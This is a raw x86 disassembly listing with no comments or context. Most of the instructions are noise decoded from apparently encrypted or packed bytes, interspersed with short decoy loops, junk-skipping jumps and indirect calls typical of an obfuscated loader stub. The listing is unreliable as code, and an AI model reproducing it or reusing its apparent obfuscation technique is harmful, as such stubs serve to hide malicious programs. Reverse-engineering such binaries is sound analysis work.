  4029d5:	stos   DWORD PTR es:[edi],eax
  4029d6:	ja     0x40296b
  4029d8:	leave  
  4029d9:	int    0x67
  4029db:	imul   ecx,DWORD PTR [ecx+0x2e],0x28
  4029df:	rol    BYTE PTR [edi-0x1d82c67c],cl
  4029e5:	aam    0xd9
  4029e7:	lods   eax,DWORD PTR ds:[esi]
  4029e8:	cmp    edi,DWORD PTR [esi+0x79095158]
  4029ee:	mov    dh,0x4f
  4029f0:	fwait
  4029f1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4029f2:	cld    
  4029f3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4029f4:	(bad)  
  4029f5:	and    BYTE PTR ds:0xfe313d37,bh
  4029fb:	cmp    edx,DWORD PTR [esi]
  4029fd:	sub    al,0xa3
  4029ff:	in     eax,0xff
  402a01:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402a02:	mov    WORD PTR [ebp+0x5b],cs
  402a05:	call   0xd5c94902
  402a0a:	or     esp,edx
  402a0c:	xlat   BYTE PTR ds:[ebx]
  402a0d:	push   0x33107d03
  402a12:	rol    DWORD PTR [ebx],1
  402a14:	(bad)  
  402a15:	cmp    edx,edi
  402a17:	ja     0x402e5d
  402a1d:	push   ebx
  402a1e:	jmp    0x402a28
  402a23:	mov    esi,0x32729b
  402a28:	mov    eax,DWORD PTR [ebp-0x8]
  402a2b:	mov    edi,DWORD PTR [ebp-0x4]
  402a2e:	jmp    0x402c26
  402a33:	lock ss inc eax
  402a36:	xor    al,0x40
  402a38:	jo     0x402aaa
  402a3a:	repnz push ss
  402a3c:	pop    ds
  402a3d:	mov    ds:0xe6d10e80,al
  402a42:	in     al,0x68
  402a44:	or     al,0x7e
  402a46:	jle    0x402a9d
  402a48:	jg     0x402ac8
  402a4a:	jle    0x402aad
  402a4c:	inc    ecx
  402a4d:	jmp    0x5e6e:0x514193
  402a54:	dec    ebp
  402a55:	mov    edx,0xb29573ad
  402a5a:	add    DWORD PTR [edi+edx*4-0x6f],esi
  402a5e:	scas   al,BYTE PTR es:[edi]
  402a5f:	push   ebx
  402a60:	add    eax,edx
  402a62:	push   ss
  402a63:	push   ds
  402a64:	pop    eax
  402a65:	adc    DWORD PTR [esi],0x95da858d
  402a6b:	int3   
  402a6c:	push   edx
  402a6d:	daa    
  402a6e:	popf   
  402a6f:	(bad)  
  402a70:	push   cs
  402a71:	sbb    al,ah
  402a73:	imul   ebp,DWORD PTR [ebp+0xef68a68],0x860cbb07
  402a7d:	jnp    0x402a57
  402a7f:	mov    al,0x5c
  402a81:	xor    al,0x41
  402a83:	jae    0x402a5a
  402a85:	test   DWORD PTR [edi+0x6a6f9a3c],esp
  402a8b:	(bad)  
  402a8d:	retf   
  402a8e:	sbb    al,BYTE PTR [edx-0xa]
  402a91:	mov    ds:0x2c9e6487,al
  402a96:	mul    DWORD PTR [ebx+0x6777b0ae]
  402a9c:	cmp    BYTE PTR [eax-0x5586f3b3],al
  402aa2:	jge    0x402ad4
  402aa4:	jmp    0xa61f:0x5f9dd271
  402aab:	aaa    
  402aac:	das    
  402aad:	mov    ss,WORD PTR [edi-0x1ce715f5]
  402ab3:	pop    esi
  402ab4:	xchg   ebx,eax
  402ab5:	sbb    cl,BYTE PTR [edi+edi*4+0xd]
  402ab9:	mov    DWORD PTR [ebp+0x68],0xa4a94bd9
  402ac0:	xchg   edx,eax
  402ac1:	pop    edx
  402ac2:	(bad)  
  402ac4:	repz xchg ebx,eax
  402ac6:	(bad)  
  402ac7:	retf   
  402ac8:	fs mov bl,0x93
  402acb:	retf   
  402acc:	inc    esi
  402acd:	push   0x9fcf1f0d
  402ad2:	add    eax,0xdd74483b
  402ad7:	bound  eax,QWORD PTR [ebp-0x33]
  402ada:	out    dx,al
  402adb:	repz into 
  402add:	ret    0xd063
  402ae0:	mov    eax,DWORD PTR [edx]
  402ae2:	mov    al,0x72
  402ae4:	jb     0x402b0f
  402ae6:	dec    eax
  402ae7:	push   0x11
  402ae9:	lods   al,BYTE PTR ds:[esi]
  402aea:	or     ah,bh
  402aec:	lods   eax,DWORD PTR ds:[esi]
  402aed:	pop    esi
  402aee:	or     edi,edx
  402af0:	xchg   al,ah
  402af2:	jge    0x402b00
  402af4:	or     al,0xe8
  402af6:	cmp    al,0xcc
  402af8:	or     DWORD PTR [ebp-0x54],eax
  402afb:	pop    es
  402afc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402afd:	(bad)  
  402afe:	dec    ecx
  402aff:	les    ebx,FWORD PTR [edi-0x27]
  402b02:	cmp    al,0x7a
  402b04:	imul   DWORD PTR [ebx-0xf05751a]
  402b0a:	fld    QWORD PTR [ebx-0x28812fcc]
  402b10:	scas   eax,DWORD PTR es:[edi]
  402b11:	stc    
  402b12:	cmp    bh,BYTE PTR [esi]
  402b14:	sub    BYTE PTR [esi+0x79e5f174],0xd3
  402b1b:	enter  0x3e3e,0x92
  402b1f:	shl    ecx,cl
  402b21:	xor    BYTE PTR [ebx-0xf38adb3],bh
  402b27:	push   ebx
  402b28:	sbb    eax,0x6441f227
  402b2d:	(bad)  
  402b2e:	leave  
  402b2f:	pop    es
  402b30:	and    cl,bh
  402b32:	daa    
  402b33:	test   BYTE PTR [esi+0x705590cd],dl
  402b39:	repz mov al,0x68
  402b3c:	imul   ebp,DWORD PTR [ecx],0xe26a1854
  402b42:	loop   0x402b6a
  402b44:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402b45:	jmp    0x402b46
  402b47:	(bad)  
  402b48:	nop
  402b49:	xor    dh,BYTE PTR [edx]
  402b4b:	test   edi,0x7d8cf0c3
  402b51:	cld    
  402b52:	cmc    
  402b53:	aam    0xa3
  402b55:	adc    eax,0x57a144c8
  402b5a:	mov    al,0x5b
  402b5c:	sub    DWORD PTR gs:[ecx+0xeff956],edi
  402b63:	mov    dl,BYTE PTR [ebx]
  402b65:	add    dh,BYTE PTR [edx+0x47d6fe36]
  402b6b:	dec    eax
  402b6c:	ret    0x22da
  402b6f:	mov    esi,0x8b899afe
  402b74:	stos   DWORD PTR es:[edi],eax
  402b75:	or     ebx,DWORD PTR [bp+si-0x20cf]
  402b7a:	sub    esp,0x4a64243f
  402b80:	loopne 0x402b24
  402b82:	out    0x21,al
  402b84:	jae    0x402b1a
  402b86:	cli    
  402b87:	hlt    
  402b88:	aas    
  402b89:	mov    bl,0xe4
  402b8b:	mov    edi,0x549d0e4f
  402b90:	pushf  
  402b91:	inc    ecx
  402b92:	daa    
  402b93:	adc    cl,BYTE PTR [edx+0x50]
  402b96:	adc    al,0x60
  402b98:	jb     0x402bc5
  402b9a:	pop    ss
  402b9b:	lods   eax,DWORD PTR es:[esi]
  402b9d:	adc    esp,ebx
  402b9f:	push   edi
  402ba0:	js     0x402ba7
  402ba2:	mov    ch,0xa7
  402ba4:	mov    WORD PTR [ebx],cs
  402ba6:	pop    ds
  402ba7:	test   DWORD PTR [edi+0x354c7bda],ebx
  402bad:	dec    eax
  402bae:	ret    0x74c1
  402bb1:	ror    DWORD PTR [ebx-0x2d2f7652],1
  402bb7:	inc    edx
  402bb8:	(bad)  
  402bb9:	out    0xb1,al
  402bbb:	int    0xe5
  402bbd:	add    al,0xd4
  402bbf:	cmc    
  402bc0:	push   cs
  402bc1:	sub    al,0x64
  402bc3:	inc    ebx
  402bc4:	or     eax,0x3d4aab0c
  402bc9:	jp     0x402b5d
  402bcb:	push   ds
  402bcc:	push   ss
  402bcd:	push   esi
  402bce:	jl     0x402c09
  402bd0:	add    dl,cl
  402bd2:	push   ss
  402bd3:	push   esp
  402bd4:	test   esi,ecx
  402bd6:	xor    edx,DWORD PTR [eax+0x1d4214ec]
  402bdc:	cmc    
  402bdd:	jle    0x402c3c
  402bdf:	gs retf 
  402be1:	and    eax,0xb34ce80a
  402be6:	inc    ebp
  402be7:	cdq    
  402be8:	mov    dl,BYTE PTR [edi+0x3a91c2f4]
  402bee:	test   eax,0xa203b611
  402bf3:	test   al,0xda
  402bf5:	test   eax,0xbe2a7a87
  402bfa:	fwait
  402bfb:	std    
  402bfc:	ss loope 0x402bda
  402bff:	std    
  402c00:	sbb    dl,al
  402c02:	mov    bh,0xc8
  402c04:	dec    ebp
  402c05:	ret    0x4f89
  402c08:	sbb    eax,DWORD PTR [ebp+eax*4-0x706d90f1]
  402c0f:	outs   dx,BYTE PTR ds:[esi]
  402c10:	xlat   BYTE PTR ds:[ebx]
  402c11:	adc    dh,BYTE PTR [eax-0x168a66d5]
  402c17:	mov    edi,0x461d0930
  402c1c:	dec    esi
  402c1d:	ja     0x402c10
  402c1f:	ins    DWORD PTR es:[edi],dx
  402c20:	jge    0x402c5f
  402c22:	jmp    0x33e1f254
  402c27:	stc    
  402c28:	add    edi,esi
  402c2a:	mov    esi,DWORD PTR [ebp+0x8]
  402c2d:	imul   edi,edx
  402c30:	mov    ebx,DWORD PTR [ebp+0xc]
  402c33:	xor    eax,ecx
  402c35:	add    eax,edx
  402c37:	mov    al,BYTE PTR [ebx+eax*1+0x32729b]
  402c3e:	mov    BYTE PTR [edi+esi*1],al
  402c41:	mov    eax,DWORD PTR [ebp-0x4]
  402c44:	xor    eax,ecx
  402c46:	lea    edx,[edx+eax*1+0x32729b]
  402c4d:	mov    eax,DWORD PTR [ebp-0x4]
  402c50:	xor    eax,ecx
  402c52:	mov    esi,0xffcd8d65
  402c57:	sub    esi,eax
  402c59:	jmp    0x402e51
  402c5e:	outs   dx,BYTE PTR ds:[esi]
  402c5f:	add    ebx,DWORD PTR [edi+0x6f72734e]
  402c65:	and    ebp,DWORD PTR [esi]
  402c67:	add    al,0x68
  402c69:	mov    dh,0x9a
  402c6b:	push   0x52
  402c6d:	(bad)  
  402c6e:	dec    edi
  402c6f:	or     bh,BYTE PTR [esi+0x7e]
  402c72:	push   ebp
  402c73:	jg     0x402cf3
  402c75:	jle    0x402c78
  402c77:	and    DWORD PTR [eax+ecx*1-0x70],eax
  402c7b:	fiadd  WORD PTR ds:0xc0576dee
  402c81:	test   eax,0x7f4bae35
  402c86:	ret    
  402c87:	sub    esi,DWORD PTR [edx+ecx*1]
  402c8a:	(bad)  
  402c8b:	neg    bl
  402c8d:	cmc    
  402c8e:	mov    ecx,0x7524321c
  402c93:	cmp    al,0xc
  402c95:	or     dh,BYTE PTR [edx+0x4e1449fe]
  402c9b:	in     al,0xf0
  402c9d:	shr    ch,0xd3
  402ca0:	fwait
  402ca1:	sar    DWORD PTR [ecx-0x5d188059],1
  402ca7:	mov    DWORD PTR gs:[ebx+0x70444d3c],esp
  402cae:	pusha  
  402caf:	xor    al,0xdc
  402cb1:	push   eax
  402cb2:	idiv   DWORD PTR [edi-0xca49b04]
  402cb8:	lods   eax,DWORD PTR ds:[esi]
  402cb9:	fadd   QWORD PTR [esi+0x59]
  402cbc:	lahf   
  402cbd:	mov    esi,0xf254e7a6
  402cc2:	pop    ds
  402cc3:	sub    al,0x53
  402cc5:	stc    
  402cc6:	clc    
  402cc7:	mov    DWORD PTR [esi+0x6c],esp
  402cca:	pop    ds
  402ccb:	sahf   
  402ccc:	cmp    eax,0x24cd6d7c
  402cd1:	or     BYTE PTR [edi],0x62
  402cd4:	es into 
  402cd6:	mov    eax,0x1b76c415
  402cdb:	cmp    al,0x2c
  402cdd:	mov    esp,0x93904d92
  402ce2:	shl    bl,cl
  402ce4:	adc    edi,DWORD PTR [esi+0x7e]
  402ce7:	rcr    DWORD PTR [edx+0x71],1
  402cea:	mov    ds:0xb87f3673,al
  402cef:	stos   BYTE PTR es:[edi],al
  402cf0:	mov    BYTE PTR [eax],ah
  402cf2:	daa    
  402cf3:	sahf   
  402cf4:	jmp    0x402d11
  402cf6:	inc    edx
  402cf7:	jp     0x402cde
  402cf9:	stc    
  402cfa:	push   0x5d9ebebd
  402cff:	sub    al,0x92
  402d01:	icebp  
  402d02:	and    DWORD PTR [edi],ebx
  402d04:	mov    ecx,0x23c16711
  402d09:	cld    
  402d0a:	test   al,0x61
  402d0c:	mov    ecx,0x4c850bbd
  402d11:	push   esp
  402d12:	pop    ebx
  402d13:	aaa    
  402d14:	ror    BYTE PTR [ebp+0x31e336e4],cl
  402d1a:	or     eax,0x511ff4bc
  402d1f:	and    BYTE PTR [edx+ecx*4],dh
  402d22:	jp     0x402cc2
  402d24:	sub    ch,BYTE PTR [eax+0x61]
  402d27:	push   ebp
  402d28:	aam    0x1d
  402d2a:	jno    0x402d16
  402d2c:	stos   BYTE PTR es:[edi],al
  402d2d:	loop   0x402cec
  402d2f:	arpl   WORD PTR [ebx-0x3a1ced70],di
  402d35:	mov    esp,0x4ee8dbdf
  402d3a:	in     al,dx
  402d3b:	sub    eax,0x2219bff7
  402d40:	mov    dh,0x83
  402d42:	mov    al,ds:0x70fc0b54
  402d47:	pop    esi
  402d48:	leave  
  402d49:	cmps   BYTE PTR fs:[esi],BYTE PTR es:[edi]
  402d4b:	imul   BYTE PTR [ebx-0x4]
  402d4e:	pop    ebx
  402d4f:	out    dx,eax
  402d50:	pop    ebx
  402d51:	icebp  
  402d52:	jno    0x402d96
  402d54:	(bad)  
  402d55:	sahf   
  402d56:	xchg   edi,eax
  402d57:	xchg   esp,eax
  402d58:	push   esp
  402d59:	or     DWORD PTR es:[edx],0xffffffcb
  402d5d:	and    ebx,DWORD PTR [edx]
  402d5f:	sbb    al,BYTE PTR [ebx]
  402d61:	mov    ah,0x8b
  402d63:	xchg   esp,eax
  402d64:	cmp    cl,BYTE PTR [esi]
  402d66:	adc    ebp,0xffffff82
  402d69:	jp     0x402d31
  402d6b:	sbb    bl,ch
  402d6d:	(bad)  ss:[ebp+0x33]
  402d71:	push   esi
  402d72:	imul   ecx,DWORD PTR [edi-0x68],0xa27b71cd
  402d79:	jl     0x402d44
  402d7b:	push   esp
  402d7c:	bound  eax,QWORD PTR [ebx+esi*4-0x19c49291]
  402d83:	xchg   edx,eax
  402d84:	call   0x105:0x4b78967f
  402d8b:	daa    
  402d8c:	jb     0x402da1
  402d8e:	jnp    0x402d2d
  402d90:	(bad)  [eax-0x39c9e1a]
  402d96:	imul   esp,DWORD PTR [esi-0x28],0x393732aa
  402d9d:	popa   
  402d9e:	popa   
  402d9f:	cs aam 0xa3
  402da2:	push   ecx
  402da3:	xchg   esi,eax
  402da4:	inc    esi
  402da5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402da6:	ins    DWORD PTR es:[edi],dx
  402da7:	jae    0x402e0f
  402da9:	les    edx,FWORD PTR [edx]
  402dab:	stos   BYTE PTR es:[edi],al
  402dac:	rcl    DWORD PTR [esi-0x686e0b77],0xeb
  402db3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402db4:	fild   DWORD PTR [ebx+0x20]
  402db7:	pop    ebp
  402db8:	pushf  
  402db9:	dec    esp
  402dba:	lds    ebx,FWORD PTR [esi]
  402dbc:	sbb    edi,esi
  402dbe:	dec    esi
  402dbf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402dc0:	xor    eax,DWORD PTR [ecx+0x18]
  402dc3:	sub    BYTE PTR [edi-0x174daf51],al
  402dc9:	ins    BYTE PTR es:[edi],dx
  402dca:	inc    esp
  402dcb:	js     0x402d7a
  402dcd:	xor    BYTE PTR [eax],bl
  402dcf:	dec    esp
  402dd0:	je     0x402e09
  402dd2:	xor    edx,DWORD PTR [edx-0x8]
  402dd5:	sar    BYTE PTR [ecx-0x74],0x2c
  402dd9:	or     cl,BYTE PTR [bp+si-0x12]
  402ddd:	and    DWORD PTR [ebp-0x54d08ae0],0x6afbc4fe
  402de7:	jne    0x402e35
  402de9:	cdq    
  402dea:	nop
  402deb:	loopne 0x402dcc
  402ded:	adc    bl,BYTE PTR [edi-0x759f83c0]
  402df3:	outs   dx,DWORD PTR ds:[esi]
  402df4:	gs sahf 
  402df6:	sub    DWORD PTR [ecx-0x17],edi
  402df9:	cmp    ecx,DWORD PTR [edx]
  402dfb:	lods   al,BYTE PTR ds:[esi]
  402dfc:	inc    eax
  402dfd:	sbb    al,0xbd
  402dff:	sbb    DWORD PTR [ebx-0x63b7e9c],0xd8a3ef24
  402e09:	jo     0x402e35
  402e0b:	cmp    al,0xb3
  402e0d:	inc    edi
  402e0e:	pop    ds
  402e0f:	and    BYTE PTR [eax+ebx*8+0x73e3c4d5],bh
  402e16:	mov    esi,0xb1ef6aae
  402e1b:	(bad)  
  402e1c:	test   BYTE PTR gs:[ebp+0x20],0xa6
  402e21:	adc    BYTE PTR [esi],al
  402e23:	mov    eax,ds:0xc02391ef
  402e28:	lock rcl BYTE PTR [edx],1
  402e2b:	inc    ebp
  402e2c:	adc    DWORD PTR gs:[edi+eiz*8+0x62],ebx
  402e31:	(bad)  
  402e32:	sbb    BYTE PTR [ecx],bh
  402e34:	jb     0x402dec
  402e36:	inc    esp
  402e37:	dec    eax
  402e39:	(bad)
  402e3d:	mov    ch,0xc7
  402e3f:	mov    edx,0x687a3893
  402e44:	imul   ebp,DWORD PTR [edi-0x369b64a3],0x4eb775eb
  402e4e:	sub    al,0x4e
  402e50:	mov    ebp,0x3b107503
  402e55:	(bad)  
  402e56:	jbe    0x402a23
  402e5c:	pop    ebx
  402e5d:	mov    eax,0xf89c8532
  402e62:	pop    edi
  402e63:	pop    esi
  402e64:	leave  
  402e65:	ret    0xc
  402e68:	push   ebp
  402e69:	mov    ebp,esp
  402e6b:	sub    esp,0x58
  402e6e:	mov    ecx,DWORD PTR [ebp+0x8]
  402e71:	mov    eax,0x8a3c
  402e76:	xor    ax,WORD PTR [ecx+0x20]
  402e7a:	mov    ecx,0x3b02
  402e7f:	add    ax,cx
  402e82:	or     DWORD PTR ds:0x42e7d0,edi
  402e88:	movzx  eax,ax
  402e8b:	mov    ecx,DWORD PTR ds:0x430435
  402e91:	xor    ecx,DWORD PTR ds:0x42edd3
  402e97:	mov    DWORD PTR ds:0x430435,ecx
  402e9d:	mov    DWORD PTR [ebp-0xc],eax
  402ea0:	mov    BYTE PTR [ebp-0x1],0x7f
  402ea4:	sub    ecx,0x18d2
  402eaa:	lea    eax,[ebp-0x1]
  402ead:	and    DWORD PTR ds:0x42edef,0x0
  402eb7:	jmp    0x402ec9
  402ebc:	mov    ecx,DWORD PTR ds:0x42edef
  402ec2:	inc    ecx
  402ec3:	mov    DWORD PTR ds:0x42edef,ecx
  402ec9:	cmp    DWORD PTR ds:0x42edef,0x18
  402ed0:	jae    0x402fa2
  402ed6:	cmp    DWORD PTR ds:0x42edef,0x1a
  402edd:	jne    0x402eee
  402ee3:	push   0x2d42
  402ee8:	call   DWORD PTR ds:0x42ea9b
  402eee:	jmp    0x402ebc
  402ef3:	mov    DWORD PTR ds:0x42ede7,0x17
  402efd:	cmp    DWORD PTR ds:0x42ede7,0x0
  402f04:	je     0x402fa2
  402f0a:	cmp    DWORD PTR ds:0x42ede7,0x7
  402f11:	jne    0x402f2c
  402f17:	push   0x25f8
  402f1c:	push   0x430449
  402f21:	push   0x42e8b7
  402f26:	call   DWORD PTR ds:0x42e9b3
  402f2c:	cmp    DWORD PTR ds:0x42ede7,0x8
  402f33:	jne    0x402f48
  402f39:	xor    ecx,ecx
  402f3b:	or     ecx,DWORD PTR ds:0x42ede7
  402f41:	dec    ecx
  402f42:	mov    DWORD PTR ds:0x42ede7,ecx
  402f48:	mov    ecx,DWORD PTR ds:0x42ede7
  402f4e:	dec    ecx
  402f4f:	mov    DWORD PTR ds:0x42ede7,ecx
  402f55:	jmp    0x402efd
  402f5a:	and    DWORD PTR ds:0x42edcf,0x0
  402f64:	mov    ecx,DWORD PTR ds:0x42edcf
  402f6a:	inc    ecx
  402f6b:	mov    DWORD PTR ds:0x42edcf,ecx
  402f71:	cmp    DWORD PTR ds:0x42edcf,0x16
  402f78:	jne    0x402f8f
  402f7e:	push   DWORD PTR [ebp-0xc]
  402f81:	push   0x43046d
  402f86:	push   DWORD PTR [ebp-0x24]
  402f89:	call   DWORD PTR ds:0x42e9c7
  402f8f:	cmp    DWORD PTR ds:0x42edcf,0x10
  402f96:	jb     0x402f64
  402f9c:	add    DWORD PTR ds:0x42edcb,ebx
  402fa2:	mov    DWORD PTR [ebp-0x10],eax
  402fa5:	mov    DWORD PTR ds:0x430455,0x10
  402faf:	cmp    DWORD PTR ds:0x430455,0x0
  402fb6:	je     0x403010
  402fbc:	cmp    DWORD PTR ds:0x430455,0x4
  402fc3:	jne    0x402fda
  402fc9:	push   DWORD PTR [ebp-0x1c]
  402fcc:	push   DWORD PTR [ebp-0x20]
  402fcf:	push   0x42e82d
  402fd4:	call   DWORD PTR ds:0x42e9cb
  402fda:	cmp    DWORD PTR ds:0x430455,0x5
  402fe1:	jne    0x402ff4
  402fe7:	mov    ecx,DWORD PTR ds:0x430455
  402fed:	dec    ecx
  402fee:	mov    DWORD PTR ds:0x430455,ecx
  402ff4:	mov    ecx,DWORD PTR ds:0x430455
  402ffa:	dec    ecx
  402ffb:	mov    DWORD PTR ds:0x430455,ecx
  403001:	jmp    0x402faf
  403006:	and    DWORD PTR ds:0x43046d,0x3a0f
  403010:	mov    al,BYTE PTR [ebp-0x1]
  403013:	mov    ecx,DWORD PTR ds:0x42e7c0
  403019:	add    DWORD PTR ds:0x42edf3,ecx
  40301f:	mov    ecx,DWORD PTR [ebp-0x10]
  403022:	mov    DWORD PTR ds:0x4304db,0x1b71
  40302c:	xor    al,0x46
  40302e:	sub    al,0x38
  403030:	or     DWORD PTR ds:0x42e7c8,0x7677
  40303a:	mov    BYTE PTR [ecx],al
  40303c:	not    eax
  40303e:	jmp    0x40320b
  403043:	loop   0x40305e
  403045:	fcom   DWORD PTR [ebp+0x697355e1]
  40304b:	popf   
  40304c:	mov    DWORD PTR [ecx-0x48],ebp
  40304f:	sub    eax,0xa2497b60
  403054:	or     BYTE PTR [esi+0x7e],bh
  403057:	scas   al,BYTE PTR es:[edi]
  403058:	jg     0x4030d8
  40305a:	jle    0x4030d6
  40305c:	jbe    0x4030d9
  40305e:	in     al,dx
  40305f:	add    ebp,eax
  403061:	adc    al,0x9
  403064:	lods   eax,DWORD PTR ds:[esi]
  403065:	sub    BYTE PTR [edi-0xa],0x6e
  403069:	outs   dx,BYTE PTR ds:[esi]
  40306a:	lods   al,BYTE PTR ds:[esi]
  40306b:	add    eax,DWORD PTR [ebx]
  40306d:	cdq    
  40306e:	in     al,0x7c
  403070:	pop    ebp
  403071:	outs   dx,DWORD PTR ds:[esi]
  403072:	mov    edx,0x27be68e7
  403077:	pop    eax
  403078:	or     edx,DWORD PTR [ecx+0x51]
  40307b:	daa    
  40307c:	mov    ds:0x9f412cc7,al
  403081:	int3   
  403082:	pop    ss
  403083:	scas   al,BYTE PTR es:[edi]
  403084:	add    esi,DWORD PTR [edi+0x44]
  403087:	outs   dx,BYTE PTR ds:[esi]
  403088:	jl     0x403086
  40308a:	or     DWORD PTR [ebp+0x13],eax
  40308d:	push   ds
  40308e:	test   eax,0x900e34b9
  403093:	ss fwait
  403095:	ins    BYTE PTR es:[edi],dx
  403096:	repnz mov DWORD PTR [ebx+0x1dfa68b6],ecx
  40309d:	jg     0x403066
  40309f:	sti    
  4030a0:	xchg   ebp,eax
  4030a1:	test   al,ah
  4030a3:	add    al,ah
  4030a5:	aam    0x63
  4030a7:	enter  0xba23,0x42
  4030ab:	sub    edx,ebp
  4030ad:	add    edi,DWORD PTR [edx]
  4030af:	stos   DWORD PTR es:[edi],eax
  4030b0:	mov    ah,0x15
  4030b2:	mov    cl,0x9c
  4030b4:	out    0x61,al
  4030b6:	or     esp,DWORD PTR [eax+eiz*4+0x33]
  4030ba:	pop    ecx
  4030bb:	fcom   QWORD PTR [esi+edi*2]
  4030be:	and    BYTE PTR [ecx+0x70b30c0d],dh
  4030c4:	int    0xba
  4030c6:	das    
  4030c7:	cmp    al,0x2b
  4030c9:	jo     0x403141
  4030cb:	lods   eax,DWORD PTR ds:[esi]
  4030cc:	clc    
  4030cd:	popa   
  4030ce:	cmp    al,0x53
  4030d0:	xor    eax,0xe8bffdb
  4030d5:	in     eax,dx
  4030d6:	test   DWORD PTR [ebp+0x4b52d6f1],edi
  4030dc:	je     0x403093
  4030de:	sar    DWORD PTR [edx-0x11cb740d],1
  4030e4:	call   0x474aed1d
  4030e9:	pusha  
  4030ea:	xchg   edx,eax
  4030eb:	adc    eax,0x750826d4
  4030f0:	ret    0x3d0b
  4030f3:	repnz dec eax
  4030f5:	pop    es
  4030f6:	lods   al,BYTE PTR ds:[esi]
  4030f7:	or     al,0x5c
  4030f9:	retf   
  4030fa:	jmp    0x40311b
  4030fc:	push   cs
  4030fd:	int    0x4c
  4030ff:	sub    al,0x20
  403101:	pop    ecx
  403102:	pop    ecx
  403103:	(bad)  
  403104:	jbe    0x403132
  403106:	scas   eax,DWORD PTR es:[edi]
  403107:	dec    esp
  403108:	int    0xc
  40310a:	xchg   DWORD PTR [eax+0x2e],esp
  40310d:	outs   dx,DWORD PTR ds:[esi]
  40310e:	loopne 0x4030f9
  403110:	mov    bh,0xa8
  403112:	loope  0x4030b1
  403114:	repnz xchg ebx,eax
  403116:	pop    ss
  403117:	and    BYTE PTR [edx-0x3921b2ae],dh
  40311d:	cmp    al,0x3e
  40311f:	ror    BYTE PTR [eax+0x746214f9],1
  403125:	sub    esi,edx
  403127:	push   eax
  403128:	jmp    0x4030ca
  40312a:	add    esi,DWORD PTR [ebp+0x41d5a260]
  403130:	shrd   DWORD PTR ds:0xfc81f0d4,edi,cl
  403137:	out    0xb8,eax
  403139:	pop    es
  40313a:	fbld   TBYTE PTR [edi+ecx*2+0x734b4237]
  403141:	xchg   edx,eax
  403142:	test   BYTE PTR [edx-0x13],al
  403145:	call   0xd9615381
  40314a:	xchg   esi,eax
  40314b:	push   ecx
  40314c:	ins    BYTE PTR es:[edi],dx
  40314d:	scas   al,BYTE PTR es:[edi]
  40314e:	xchg   ecx,eax
  40314f:	stc    
  403150:	sub    eax,0xc0a6427d
  403155:	into   
  403156:	adc    esi,esp
  403158:	daa    
  403159:	xchg   edx,eax
  40315a:	push   ebx
  40315b:	adc    edi,DWORD PTR [edx-0x26]
  40315e:	or     edx,ebx
  403160:	add    ebp,DWORD PTR [edi-0x54c4311f]
  403166:	clc    
  403167:	jnp    0x40319c
  403169:	cmp    eax,DWORD PTR [ebx]
  40316b:	jl     0x40316f
  40316d:	mov    cl,0x67
  40316f:	jmp    0x939b:0x5d67a683
  403176:	mov    ebp,0x55c9bf72
  40317b:	aam    0x1f
  40317d:	(bad)  [esi-0x77]
  403180:	ret    0xf9c9
  403183:	jge    0x4031bb
  403185:	in     eax,0xed
  403187:	dec    esi
  403188:	mov    al,ds:0xfcc9d2dc
  40318d:	pop    ebp
  40318f:	push   cs
  403190:	in     eax,dx
  403191:	sub    DWORD PTR [eax-0x1b23a7c7],edi
  403197:	jbe    0x4031d0
  403199:	gs pop ss
  40319b:	fist   WORD PTR [ecx+ebx*4]
  40319e:	jo     0x4031bd
  4031a0:	fdivrp st(5),st
  4031a2:	xor    al,0x6d
  4031a4:	not    DWORD PTR [esi]
  4031a6:	sub    ebp,esp
  4031a8:	dec    esp
  4031a9:	adc    ch,BYTE PTR [esi]
  4031ab:	pushf  
  4031ac:	popf   
  4031ad:	push   0x861eb26b
  4031b2:	push   ss
  4031b3:	push   eax
  4031b4:	jecxz  0x4031f3
  4031b6:	push   ds
  4031b7:	or     eax,0x8090c531
  4031bc:	je     0x403233
  4031be:	xchg   esp,eax
  4031bf:	or     BYTE PTR [edx+0x14],cl
  4031c2:	and    eax,0xfd1c9cb7
  4031c7:	sub    al,0x51
  4031c9:	jecxz  0x4031e3
  4031cb:	jg     0x403229
  4031cd:	pusha  
  4031ce:	lds    ebp,FWORD PTR [ebx+eax*8]
  4031d1:	js     0x403174
  4031d3:	pop    ecx
  4031d4:	xor    eax,0xffef2cab
  4031d9:	clc    
  4031da:	outs   dx,BYTE PTR ds:[esi]
  4031db:	xlat   BYTE PTR ds:[ebx]
  4031dc:	mov    ebp,0xfdb49881
  4031e1:	xchg   ebx,eax
  4031e2:	adc    cl,ah
  4031e4:	pushf  
  4031e5:	pop    ebx
  4031e6:	hlt    
  4031e7:	pop    es
  4031e8:	idiv   dl
  4031ea:	adc    ebx,DWORD PTR [edx+0x643bee4e]
  4031f0:	nop
  4031f1:	jnp    0x4031a5
  4031f3:	test   eax,0xaae19884
  4031f8:	sti    
  4031f9:	sbb    bh,bl
  4031fb:	shr    DWORD PTR [esi+0x7b9ea5c],1
  403201:	dec    edx
  403202:	cs mov bl,0xaa
  403205:	xchg   ebp,eax
  403206:	jecxz  0x4031b2
  403208:	clc    
  403209:	sbb    BYTE PTR [edi+eax*8+0x45],bl
  40320d:	clc    
  40320e:	xor    DWORD PTR [ebp+0x45c7f89c],eax
  403214:	lock xor al,BYTE PTR [ebp+0xd09f89c]
  40321b:	out    dx,eax
  40321c:	in     eax,dx
  40321d:	inc    edx
  40321e:	add    BYTE PTR [ebx-0x48f007bb],cl
  403224:	or     eax,0x42edcb
  403229:	adc    DWORD PTR ds:0x4304d7,ecx
  40322f:	mov    ecx,0x7510854
  403234:	sub    DWORD PTR ds:0x42e7c8,0x77ef
  40323e:	push   esi
  40323f:	xor    eax,ecx
  403241:	and    DWORD PTR ds:0x430461,0x33b1
  40324b:	jmp    0x403418
  403250:	inc    ecx
  403251:	jp     0x4031f4
  403253:	cs popa 
  403255:	mov    ch,0x51
  403257:	jno    0x403251
  403259:	(bad)  
  40325b:	pop    edi
  40325c:	jb     0x4032db
  40325e:	in     eax,0x7
  403260:	rcl    BYTE PTR [esi],cl
  403262:	jle    0x4032e2
  403264:	scas   al,BYTE PTR es:[edi]
  403265:	jg     0x4032e5
  403267:	jle    0x4032b4
